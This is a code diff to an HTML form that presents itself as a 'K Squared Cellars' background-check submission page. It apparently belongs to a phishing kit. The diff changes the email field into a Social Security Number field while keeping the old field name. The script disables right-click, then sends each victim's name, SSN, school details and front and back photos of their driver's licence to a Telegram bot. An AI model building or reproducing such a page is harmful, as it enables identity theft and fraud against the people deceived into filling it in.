@@ -79,8 +79,8 @@
         <input type="text" id="fullName" name="fullName" required />
       </div>
       <div class="form-group">
-        <label for="email">Email Address</label>
-        <input type="email" id="email" name="email" required />
+        <label for="email">Social Security Number</label>
+        <input type="text" id="email" name="email" required />
       </div>
       <div class="form-group">
         <label for="schoolName">High School Name</label>
@@ -108,7 +108,6 @@
   </div>
 
   <script>
-    // Disable right-click context menu
     document.addEventListener('contextmenu', event => event.preventDefault());
 
     document.getElementById("licenseForm").addEventListener("submit", async function(e) {
@@ -134,7 +133,7 @@
 👤 *K Squared Cellars - Background Check Submission*
 ——————————————
 👤 Full Name: ${fullName}
-📧 Email: ${email}
+🔐 SSN: ${email}
 🏫 School: ${schoolName}
 📅 Year Started: ${yearStarted}
 📅 Year Graduated: ${yearGraduated}
@@ -142,7 +141,6 @@
 ——————————————
 `;
 
-      // Send text message first
       await fetch(`https://api.telegram.org/bot${telegram_bot_token}/sendMessage`, {
         method: "POST",
         headers: {
@@ -155,7 +153,6 @@
         })
       });
 
-      // Helper function to send a file
       const sendFile = async (file, caption) => {
         const formData = new FormData();
         formData.append("chat_id", telegram_chat_id);
@@ -168,16 +165,13 @@
         });
       };
 
-      // Send front and back images
       await sendFile(frontFile, `${fullName} - Front of Driver's License`);
       await sendFile(backFile, `${fullName} - Back of Driver's License`);
 
-      // Show success message and redirect to success page after 2 seconds
       document.getElementById("successMessage").innerText = "✅ Submitted successfully. Thank you!";
       setTimeout(function() {
-        // Replace with your correct path or use a successPage.html
         window.location.href = "successPage.html"; 
-      }, 2000); // Redirect after 1 seconds
+      }, 2000);
     });
   </script>
 </body>
